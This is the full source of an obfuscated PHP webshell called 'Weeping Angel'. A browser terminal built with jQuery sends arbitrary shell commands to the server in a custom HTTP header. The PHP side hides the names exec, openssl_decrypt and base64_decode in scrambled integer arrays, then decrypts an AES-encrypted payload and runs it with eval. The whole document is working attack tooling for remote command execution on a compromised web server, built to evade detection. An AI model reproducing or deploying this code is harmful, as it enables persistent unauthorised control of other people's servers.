<?php if (strlen($_SERVER['HTTP_USER_ID']) === 0): ?>
<!DOCType html>
<html>
<head>
    <title>Weeping Angel Webshell</title>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <!-- HTML Terminal: https://itnext.io/how-to-create-interactive-terminal-like-website-888bb0972288 -->
</head>
<style>
    body {
        background-color: #000;
    }
</style>
<body>
    <div>
        <script>
            // To keep track of the current path.
            var CURRENT_PATH = ".";

            function sendCommand(command, terminal) {
                
                var code = 0;
                var result = "Failed to execute command!";

                // Keep track of current path.
                if (!command.startsWith("cd ")) {
                    command = "cd " + CURRENT_PATH +  ";" + command;
                } else {
                    CURRENT_PATH = command.substr(3);
                }

                // Send request.
                const req = new XMLHttpRequest();
                req.open("POST", "", true);
                req.setRequestHeader("USER_ID", command);
                req.onreadystatechange = function() {
                    if (this.readyState != 4) {
                        // Finished request;
                        return;
                    }

                    if (this.status == 200) {
                        const {result, code} = JSON.parse(this.responseText);

                        console.log(code);
                        switch (code) {
                            case 127: {
                                terminal.echo("Sorry, command not found!");
                                return;
                            }
                            case 2: {
                                terminal.echo("Path not found!");
                                return;
                            }
                            case 1:
                            case 13: {
                                terminal.echo("Permission denied!");
                                return;
                            }
                            case 21: {
                                terminal.echo("Is a directory!");
                                return;
                            }
                            case 17: {
                                terminal.echo("File exists!");
                                return;
                            }
                            case 22: {
                                terminal.echo("Invalid argument");
                                return;
                            }
                            case 111: {
                                terminal.echo("Connection refused!");
                                return;
                            }
                            case 110: {
                                terminal.echo("Connection timed out!");
                                return;
                            }
                            case 112: {
                                terminal.echo("Host is down!");
                                return;
                            }
                            case 113: {
                                terminal.echo("No route to host!");
                                return;
                            }

                            default: {
                                break;
                            }
                        }

                        // Print output to terminal.
                        for (r of result) {
                            terminal.echo(r)
                        }
                    }
                }
                req.send();
                return {"code":code, "result": result};
            }
            
            $('div').terminal(function(command) {
                        switch(command) 
                        {
                        case "hello": {
                            this.echo("Hi");
                            break;
                        }
                        case "help": { 
                            this.echo("WeepingAngel WebShell 1.0\n\nhelp  ?  author  exit\nclear $(any current installed command)\npic  vid")
                            break;
                        }
                        case "author":  {
                            this.echo("WeepingAngel 2.0 (c) 2024 ramb0\n")
                            break;
                        }
                        case "weeping angel": {
                            this.echo($('<img src="https://cdna.artstation.com/p/assets/images/images/006/265/378/large/dedy-d-weepingangel.jpg?1497264878&dl=1">'))
                            break;
                        }
                        default: {
                            if (command == "" || command.length == 0) {
                                break;
                            }

                            sendCommand(command, this);
                            break;
                        }
                        }
                    }, {
                        greetings: 
                        " █     █▓█████▓█████ ██▓███  ██▓███▄    █  ▄████ ▄▄▄      ███▄    █  ▄████▓█████ ██▓    \n"+
                        "▓█░ █ ░█▓█   ▀▓█   ▀▓██░  ██▓██▒██ ▀█   █ ██▒ ▀█▒████▄    ██ ▀█   █ ██▒ ▀█▓█   ▀▓██▒    \n"+
                        "▒█░ █ ░█▒███  ▒███  ▓██░ ██▓▒██▓██  ▀█ ██▒██░▄▄▄▒██  ▀█▄ ▓██  ▀█ ██▒██░▄▄▄▒███  ▒██░    \n"+
                        "░█░ █ ░█▒▓█  ▄▒▓█  ▄▒██▄█▓▒ ░██▓██▒  ▐▌██░▓█  ██░██▄▄▄▄██▓██▒  ▐▌██░▓█  ██▒▓█  ▄▒██░    \n"+
                        "░░██▒██▓░▒████░▒████▒██▒ ░  ░██▒██░   ▓██░▒▓███▀▒▓█   ▓██▒██░   ▓██░▒▓███▀░▒████░██████▒\n"+
                        "░ ▓░▒ ▒ ░░ ▒░ ░░ ▒░ ▒▓▒░ ░  ░▓ ░ ▒░   ▒ ▒ ░▒   ▒ ▒▒   ▓▒█░ ▒░   ▒ ▒ ░▒   ▒░░ ▒░ ░ ▒░▓  ░\n"+
                        "  ▒ ░ ░  ░ ░  ░░ ░  ░▒ ░     ▒ ░ ░░   ░ ▒░ ░   ░  ▒   ▒▒ ░ ░░   ░ ▒░ ░   ░ ░ ░  ░ ░ ▒  ░\n"+
                        "  ░   ░    ░     ░  ░░       ▒ ░  ░   ░ ░░ ░   ░  ░   ▒     ░   ░ ░░ ░   ░   ░    ░ ░   \n"+
                        "    ░      ░  ░  ░  ░        ░          ░      ░      ░  ░        ░      ░   ░  ░   ░  ░ v2\n"+
                        "Wahh It's the weeping angel!\n",
                        prompt: "@ngel~$ "
                                                                                                    
                    });
        </script>
    </div>
</body>
</html>
<?php endif; ?>

<?php 

    if (isset($_POST)) {

        $NOTHING = ""; // Our empty variable.
        $PASSWORD = "PASSWORD_PLACEHOLDER";
        $INIT_VECTOR = 1111222233334444;
        
        // Function that decodes strings.
        $FUNCTION_NAME_DECODER = function ($TO_DECODE_NAME) {
            $DECODED_NAME = "";
            for ($X = 0; $X < count($TO_DECODE_NAME); $X += 3) {
                $DECODED_NAME = $DECODED_NAME . chr($TO_DECODE_NAME[$X]);
            }
            return $DECODED_NAME;
        };

        // Get our str_replace().
        $FN_STR_REPLACE = [115, 102, 192, 116, 175, 105, 114, 102, 117, 95, 191, 167, 114, 166, 186, 101, 152, 185, 112, 165, 142, 108, 106, 198, 97, 149, 177, 99, 169, 187, 101, 112, 150];
        $STR_REPLACE = $FUNCTION_NAME_DECODER($FN_STR_REPLACE);

        // Get our exec().
        $FN_PRE_EXEC = [102, 100, 125, 101, 131, 195, 97, 194, 190, 110, 104, 101, 102, 153, 157, 106, 136, 124];
        $FN_EXEC = [102, 165, 117, 101, 139, 181, 97, 131, 190, 110, 197, 127, 102, 168, 176, 106, 189, 140, 101, 128, 153, 120, 180, 195, 101, 140, 103, 99, 131, 161];
        $EXEC = $STR_REPLACE(
            $FUNCTION_NAME_DECODER($FN_PRE_EXEC), 
            $NOTHING,
            $FUNCTION_NAME_DECODER($FN_EXEC),
        );

        // Get our openssl_decrypt().
        $FN_PRE_SSL_DEC = [99, 161, 158, 97, 141, 151, 110, 187, 147, 106, 137, 155, 107, 131, 166, 110, 180, 100, 106, 195, 188];
        $FN_SSL_DEC = [99, 189, 140, 97, 172, 148, 110, 123, 141, 106, 188, 177, 107, 117, 186, 110, 160, 138, 106, 132, 154, 111, 186, 169, 112, 138, 115, 101, 143, 160, 110, 148, 115, 115, 120, 199, 115, 119, 135, 108, 200, 147, 95, 195, 189, 100, 131, 176, 101, 111, 148, 99, 165, 114, 114, 200, 200, 121, 170, 119, 112, 115, 119, 116, 156, 127];
        $OPENSSL_DECRYPT = $STR_REPLACE(
            $FUNCTION_NAME_DECODER($FN_PRE_SSL_DEC),
            $NOTHING,
            $FUNCTION_NAME_DECODER($FN_SSL_DEC)
        );

        // Get our base64_decode().
        $FN_PRE_BASE = [99, 144, 114, 110, 110, 105, 97, 105, 172, 101, 117, 154, 111, 187, 115, 114, 172, 162, 107, 117, 163, 106, 151, 165, 110, 116, 173];
        $FN_BASE_DEC = [99, 114, 138, 110, 152, 147, 97, 122, 187, 101, 169, 144, 111, 114, 114, 114, 103, 145, 107, 137, 184, 106, 123, 111, 110, 187, 129, 98, 169, 115, 97, 129, 122, 115, 162, 175, 101, 196, 100, 54, 136, 199, 52, 168, 138, 95, 186, 178, 100, 198, 156, 101, 113, 185, 99, 168, 143, 111, 183, 119, 100, 167, 156, 101, 192, 123];
        $BASE64_DECODE = $STR_REPLACE(
            $FUNCTION_NAME_DECODER($FN_PRE_BASE),
            $NOTHING,
            $FUNCTION_NAME_DECODER($FN_BASE_DEC)
        );
        
        // Get USER_TAG str.
        $FN_PRE_USER_ID = [101, 178, 117, 102, 183, 180, 110, 172, 104, 101, 158, 104, 97, 193, 198, 106, 112, 157];
        $FN_USER_ID = [101, 148, 177, 102, 181, 117, 110, 135, 137, 101, 136, 198, 97, 185, 155, 106, 198, 150, 72, 142, 105, 84, 155, 179, 84, 196, 130, 80, 142, 195, 95, 111, 101, 85, 169, 182, 83, 144, 114, 69, 127, 186, 82, 143, 155, 95, 108, 128, 73, 121, 104, 68, 116, 195];
        $USER_TAG = $STR_REPLACE(
            $FUNCTION_NAME_DECODER($FN_PRE_USER_ID),
            $NOTHING,
            $FUNCTION_NAME_DECODER($FN_USER_ID)
        );

        // Get AES method. (AES-128-CTR)
        $FN_PRE_AES = [97, 161, 161, 115, 145, 144, 110, 104, 185, 101, 196, 117, 120, 193, 111, 112, 150, 170, 114, 187, 108, 107, 197, 175];
        $FN_AES_METHOD = [97, 162, 149, 115, 173, 145, 110, 181, 190, 101, 122, 167, 120, 136, 145, 112, 162, 193, 114, 146, 107, 107, 138, 144, 65, 188, 136, 69, 130, 156, 83, 125, 156, 45, 159, 137, 49, 100, 127, 50, 177, 167, 56, 103, 171, 45, 192, 138, 67, 197, 180, 84, 114, 158, 82, 100, 148];
        $AES_METHOD = $STR_REPLACE(
            $FUNCTION_NAME_DECODER($FN_PRE_AES),
            $NOTHING,
            $FUNCTION_NAME_DECODER($FN_AES_METHOD)
        );

        /**
         * Now that all obfuscated functions are decoded, we can 
         * now decrypt the actual payload to execute.
         * 
         * Functions:
         *  exec()
         *  eval()
         *  openssl_decrypt()
         *  base64_decode()
         *  substr()
         *  HTTP_USER_ID variable
         *  AES_METHOD constant variable
         *
         **/
        
        // Now we need to decrypt our payload that executes eval.
        $ENCRYPTED_PAYLOAD = $BASE64_DECODE($PAYLOAD_PLACE);
        $DECRYPTED_PAYLOAD = $OPENSSL_DECRYPT($ENCRYPTED_PAYLOAD, $AES_METHOD, $PASSWORD, OPENSSL_RAW_DATA, $INIT_VECTOR);
        
        // Execute our code.
        eval($DECRYPTED_PAYLOAD);
    }

    die();
?>